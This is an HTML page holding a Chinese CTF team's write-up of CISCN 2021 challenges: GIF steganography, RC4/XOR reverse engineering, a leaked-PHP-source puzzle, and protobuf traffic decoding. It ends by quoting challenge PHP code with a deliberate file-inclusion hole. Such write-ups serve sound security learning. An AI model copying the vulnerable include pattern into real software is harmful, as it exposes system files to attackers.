<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>CISCN writeup | r00t信息安全战队</title>
    <meta name="generator" content="VuePress 1.9.9">
    
    <meta name="description" content="分享 | 求知 | 提升">
    
    <link rel="preload" href="/assets/css/0.styles.e8e4f3a3.css" as="style"><link rel="preload" href="/assets/js/app.1eac7796.js" as="script"><link rel="preload" href="/assets/js/2.da4aa226.js" as="script"><link rel="preload" href="/assets/js/33.8ec69a13.js" as="script"><link rel="prefetch" href="/assets/js/10.6818eed9.js"><link rel="prefetch" href="/assets/js/11.c5844bad.js"><link rel="prefetch" href="/assets/js/12.54862c7d.js"><link rel="prefetch" href="/assets/js/13.dd8c8750.js"><link rel="prefetch" href="/assets/js/14.617bb0c2.js"><link rel="prefetch" href="/assets/js/15.f27cce8c.js"><link rel="prefetch" href="/assets/js/16.979d9069.js"><link rel="prefetch" href="/assets/js/17.97839523.js"><link rel="prefetch" href="/assets/js/18.55f9e085.js"><link rel="prefetch" href="/assets/js/19.0b3f3b95.js"><link rel="prefetch" href="/assets/js/20.23bc5ab1.js"><link rel="prefetch" href="/assets/js/21.af5f5ba5.js"><link rel="prefetch" href="/assets/js/22.f640f616.js"><link rel="prefetch" href="/assets/js/23.f69547ef.js"><link rel="prefetch" href="/assets/js/24.6e00637a.js"><link rel="prefetch" href="/assets/js/25.6fb26861.js"><link rel="prefetch" href="/assets/js/26.c2d2abef.js"><link rel="prefetch" href="/assets/js/27.cb617287.js"><link rel="prefetch" href="/assets/js/28.639cddd1.js"><link rel="prefetch" href="/assets/js/29.1c62d8ae.js"><link rel="prefetch" href="/assets/js/3.0f769c09.js"><link rel="prefetch" href="/assets/js/30.7cbff6e2.js"><link rel="prefetch" href="/assets/js/31.6a66925e.js"><link rel="prefetch" href="/assets/js/32.d8004455.js"><link rel="prefetch" href="/assets/js/34.4a42a1bd.js"><link rel="prefetch" href="/assets/js/4.ddc6d2f6.js"><link rel="prefetch" href="/assets/js/5.175964b3.js"><link rel="prefetch" href="/assets/js/6.da13883d.js"><link rel="prefetch" href="/assets/js/7.0de84f15.js"><link rel="prefetch" href="/assets/js/8.c6432f97.js"><link rel="prefetch" href="/assets/js/9.72c27c98.js">
    <link rel="stylesheet" href="/assets/css/0.styles.e8e4f3a3.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container no-sidebar"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">r00t信息安全战队</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/finance.html" class="nav-link">
  财务公开
</a></div><div class="nav-item"><a href="/kb/" class="nav-link">
  知识库
</a></div><div class="nav-item"><a href="/writeup/" class="nav-link router-link-active">
  WriteUp
</a></div><div class="nav-item"><a href="/wiki/" class="nav-link">
  原 Wiki
</a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/finance.html" class="nav-link">
  财务公开
</a></div><div class="nav-item"><a href="/kb/" class="nav-link">
  知识库
</a></div><div class="nav-item"><a href="/writeup/" class="nav-link router-link-active">
  WriteUp
</a></div><div class="nav-item"><a href="/wiki/" class="nav-link">
  原 Wiki
</a></div> <!----></nav>  <!----> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="ciscn-writeup"><a href="#ciscn-writeup" class="header-anchor">#</a> CISCN writeup</h1> <p>by r00t-2021</p> <h2 id="场景实操开场卷"><a href="#场景实操开场卷" class="header-anchor">#</a> 场景实操开场卷</h2> <h2 id="running-pixels"><a href="#running-pixels" class="header-anchor">#</a> Running pixels</h2> <p>奇怪的GIF，把每一帧提出来，能明显地看到10帧一循环。挑出最奇怪的第9、19、29……帧拖进stegsolve，发现有一个落单的像素点：</p> <p><img src="2021-ciscn/1-1-1.png" alt=""></p> <p>写脚本提取之，发现大多数帧上都有落单的像素点，颜色固定为<code>(233, 233, 233)</code>。所有像素点拼在一起，构成若干字母和数字：</p> <p><img src="2021-ciscn/1-1-2.png" alt=""></p> <p>顺序由像素点构成字母数字的过程决定，需要逐帧绘制过程。脚本如下：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python3</span>

<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image

found_px <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

<span class="token comment">#for i in range(9, 382, 9):</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">382</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	img <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'frames/frame%03d.png'</span> <span class="token operator">%</span> i<span class="token punctuation">)</span><span class="token punctuation">.</span>convert<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">)</span>
	imgdata <span class="token operator">=</span> img<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>
	size <span class="token operator">=</span> img<span class="token punctuation">.</span>size
	tgt <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">233</span><span class="token punctuation">,</span> <span class="token number">233</span><span class="token punctuation">,</span> <span class="token number">233</span><span class="token punctuation">)</span>
	<span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>size<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>size<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
			<span class="token keyword">if</span> imgdata<span class="token punctuation">[</span>x<span class="token punctuation">,</span> y<span class="token punctuation">]</span> <span class="token operator">==</span> tgt<span class="token punctuation">:</span>
				found_px<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">,</span> imgdata<span class="token punctuation">[</span>x<span class="token punctuation">,</span> y<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
				<span class="token keyword">break</span>
	<span class="token keyword">pass</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>found_px<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>found_px<span class="token punctuation">)</span>

out <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">,</span> color <span class="token operator">=</span> <span class="token string">'black'</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i<span class="token punctuation">,</span> xy<span class="token punctuation">,</span> color <span class="token keyword">in</span> found_px<span class="token punctuation">:</span>
	out<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span>xy<span class="token punctuation">,</span> color<span class="token punctuation">)</span>
	out<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'outs/out%03d.png'</span> <span class="token operator">%</span> i<span class="token punctuation">)</span>

out<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'out.png'</span><span class="token punctuation">)</span>
out<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

last_xy <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
out <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">,</span> color <span class="token operator">=</span> <span class="token string">'black'</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i<span class="token punctuation">,</span> xy<span class="token punctuation">,</span> color <span class="token keyword">in</span> found_px<span class="token punctuation">:</span>
	out<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span>xy<span class="token punctuation">,</span> color<span class="token punctuation">)</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>xy<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> last_xy<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">**</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token punctuation">(</span>xy<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> last_xy<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">**</span> <span class="token number">2</span> <span class="token operator">&gt;=</span> <span class="token number">30</span><span class="token punctuation">:</span>
		out<span class="token punctuation">.</span>transpose<span class="token punctuation">(</span>Image<span class="token punctuation">.</span>FLIP_LEFT_RIGHT<span class="token punctuation">)</span><span class="token punctuation">.</span>transpose<span class="token punctuation">(</span>Image<span class="token punctuation">.</span>ROTATE_90<span class="token punctuation">)</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'outs2/out%03d.png'</span> <span class="token operator">%</span> i<span class="token punctuation">)</span>
	last_xy <span class="token operator">=</span> xy

out<span class="token punctuation">.</span>transpose<span class="token punctuation">(</span>Image<span class="token punctuation">.</span>FLIP_LEFT_RIGHT<span class="token punctuation">)</span><span class="token punctuation">.</span>transpose<span class="token punctuation">(</span>Image<span class="token punctuation">.</span>ROTATE_90<span class="token punctuation">)</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'outs2/outlast.png'</span><span class="token punctuation">)</span>
out<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br></div></div><p><code>CISCN{12504d0f-9de1-4b00-87a5-a5fdd0986a00}</code></p> <h2 id="glass"><a href="#glass" class="header-anchor">#</a> glass</h2> <p>扑面而来的JNI，好在没有太乱的东西。前面几个对缓冲区的处理越看越像RC4，索性当作RC4理解：</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">!=</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	v3<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>
	<span class="token function">sub_126C</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> v5<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 取模运算，结果存R1</span>
	v12<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> v4<span class="token punctuation">[</span>v7<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// v7 == R1</span>
<span class="token punctuation">}</span>
v8 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
v9 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span> v8 <span class="token operator">!=</span> <span class="token number">256</span> <span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	v10 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>v3<span class="token punctuation">[</span>v8<span class="token punctuation">]</span><span class="token punctuation">;</span>
	v9 <span class="token operator">=</span> <span class="token punctuation">(</span>v9 <span class="token operator">+</span> v10 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>v12<span class="token punctuation">[</span>v8<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>
	v3<span class="token punctuation">[</span>v8<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> v3<span class="token punctuation">[</span>v9<span class="token punctuation">]</span><span class="token punctuation">;</span>
	v3<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token operator">=</span> v10<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><p>算完RC4还有一个函数，分块异或外加写得及其花哨的逐字节异或：</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> a2<span class="token punctuation">;</span> j <span class="token operator">+=</span> a4 <span class="token punctuation">)</span>                <span class="token comment">// looped xor</span>
<span class="token punctuation">{</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">(</span>a4 <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token punctuation">(</span>a4 <span class="token operator">&gt;&gt;</span> <span class="token number">31</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> k <span class="token operator">&amp;&amp;</span> j <span class="token operator">+</span> k <span class="token operator">&lt;</span> a2<span class="token punctuation">;</span> <span class="token operator">++</span>k <span class="token punctuation">)</span><span class="token comment">// for(k = 0; a4 != k &amp;&amp; (j + k) &lt; a2; k++)</span>
		<span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>result <span class="token operator">+</span> k<span class="token punctuation">)</span> <span class="token operator">^=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a3 <span class="token operator">+</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>
	result <span class="token operator">+=</span> a4<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>写脚本跑出flag即可：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python3</span>

<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> ARC4

key <span class="token operator">=</span> <span class="token string">b'12345678'</span>
target <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token number">0xA3</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0xE3</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x84</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0xC2</span><span class="token punctuation">,</span> 
    <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0x9E</span><span class="token punctuation">,</span> <span class="token number">0x96</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x1F</span><span class="token punctuation">,</span> <span class="token number">0x8E</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x4F</span><span class="token punctuation">,</span> 
    <span class="token number">0xE1</span><span class="token punctuation">,</span> <span class="token number">0xEB</span><span class="token punctuation">,</span> <span class="token number">0xAF</span><span class="token punctuation">,</span> <span class="token number">0xF0</span><span class="token punctuation">,</span> <span class="token number">0xEA</span><span class="token punctuation">,</span> <span class="token number">0xC4</span><span class="token punctuation">,</span> <span class="token number">0xA8</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token number">0xC7</span><span class="token punctuation">,</span> 
    <span class="token number">0x6E</span><span class="token punctuation">,</span> <span class="token number">0x3F</span><span class="token punctuation">,</span> <span class="token number">0xB0</span><span class="token punctuation">,</span> <span class="token number">0xD3</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0xF9</span><span class="token punctuation">,</span> <span class="token number">0x98</span><span class="token punctuation">,</span> <span class="token number">0x3F</span>
<span class="token punctuation">]</span>

out <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">[</span>x <span class="token operator">^</span> key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i<span class="token punctuation">,</span> x <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>out<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    real_1 <span class="token operator">=</span> out<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> out<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">0</span><span class="token punctuation">]</span>
    real_2 <span class="token operator">=</span> out<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^</span> real_1
    real_0 <span class="token operator">=</span> out<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">^</span> real_2
    out<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> real_0
    out<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> real_1
    out<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> real_2

<span class="token keyword">print</span><span class="token punctuation">(</span>ARC4<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>out<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br></div></div><p><code>CISCN{6654d84617f627c88846c172e0f4d46c}</code></p> <h2 id="easy-source"><a href="#easy-source" class="header-anchor">#</a> easy_source</h2> <p>发现存在一个<code>.index.php.swo</code>，打开之后发现提示了部分源码，源码中设置了一个User类，存在大量的方法</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span>
<span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token operator">++</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token variable">$c</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function-definition function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token operator">++</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token variable">$c</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function-definition function">c</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token operator">++</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token variable">$c</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</span></code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><p>猜测User类中的方法可能隐藏了信息，所以使用<code>ReflectionMethod</code>遍历获取所有方法的信息，最后在q方法的@access注解中，发现了flag</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token comment">/**
     * Increment counter
     *
     * @final
     * @static
     * @access  publicCISCN{2CxzP-Yuu3n-3nfxN-hwB37-trDND-}
     * @return  int
     */</span>
Method <span class="token punctuation">[</span> <span class="token operator">&lt;</span>user<span class="token operator">&gt;</span> <span class="token keyword">public</span> method q <span class="token punctuation">]</span> <span class="token punctuation">{</span>
  @@ <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>index<span class="token operator">.</span>php <span class="token number">207</span> <span class="token operator">-</span> <span class="token number">210</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><h2 id="tiny-traffic"><a href="#tiny-traffic" class="header-anchor">#</a> tiny traffic</h2> <p>打开流量包，过滤HTTP协议，在<code>192.168.2.193</code>发现了flag_wrapper、test、secret，flag_wrapper为CISCN{}，test和secret是被Brotli压缩的数据，使用python进行解压缩。发现test为proto3的数据定义，使用<code>protoc --python_out=. test.proto</code>生成对应的python结构文件，编写脚本对secret进行解码</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">from</span> test_pb2 <span class="token keyword">import</span> PBResponse

f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&quot;secret.pb&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;rb&quot;</span><span class="token punctuation">)</span>
resp <span class="token operator">=</span> PBResponse<span class="token punctuation">(</span><span class="token punctuation">)</span>
resp<span class="token punctuation">.</span>ParseFromString<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">)</span>
f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>输出反序列化之后的结构</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>code: 200
flag_part_convert_to_hex_plz: 15100450
dataList {
  flag_part: &quot;e2345&quot;
  junk_data: &quot;7af2c&quot;
}
dataList {
  flag_part: &quot;7889b0&quot;
  junk_data: &quot;82bc0&quot;
}
flag_part_plz_convert_to_hex: 16453958
flag_last_part: &quot;d172a38dc&quot;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p>根据结构指示拼接成flag:CISCN{e66a22e23457889b0fb1146d172a38dc}</p> <h2 id="场景实操二阶卷"><a href="#场景实操二阶卷" class="header-anchor">#</a> 场景实操二阶卷</h2> <h2 id="middle-source"><a href="#middle-source" class="header-anchor">#</a> middle_source</h2> <p>在主页中列出了源码，存在一个文件包含漏洞</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;your flag is in some file in /etc &quot;</span><span class="token punctuation">;</span>
    <span class="token variable">$fielf</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;field&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$cf</span><span class="token operator">=</span><span class="token string double-quoted-string">&quot;/tmp/app_auth/cfile/&quot;</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$cf</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">include</span> <span class="token variable">$cf</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$$field</span><span class="token punctuation">;</span>
        <span class="token keyword">exit</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">;</span>
        <span class="token keyword">exit</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span> your flag is in some file in /etc
